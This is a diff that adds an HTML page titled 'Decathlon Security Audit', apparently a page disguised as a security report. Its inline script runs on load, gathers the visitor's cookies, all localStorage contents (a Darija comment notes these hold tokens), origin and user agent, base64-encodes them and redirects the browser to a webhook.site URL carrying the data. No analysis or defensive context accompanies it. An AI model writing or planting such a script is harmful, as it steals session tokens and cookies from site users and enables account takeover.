@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Decathlon Security Audit</title>
+</head>
+<body>
+    <h1>Security Analysis...</h1>
+    <script>
+        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+
+        // غانجمعو كاع داكشي اللي قدرنا عليه (حتىLocalStorage اللي فيه التوكنز)
+        var dataToSteal = {
+            origin: window.location.origin,
+            ua: navigator.userAgent,
+            cookies: document.cookie, 
+            localStorage: JSON.stringify(localStorage)
+        };
+
+        // تشفير البيانات
+        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(dataToSteal))));
+
+        // الضربة القاضية: صيفط الداتا لـ Webhook بزز منه
+        window.location.href = webhook + "?full_leak=" + payload;
+    </script>
+</body>
+</html>
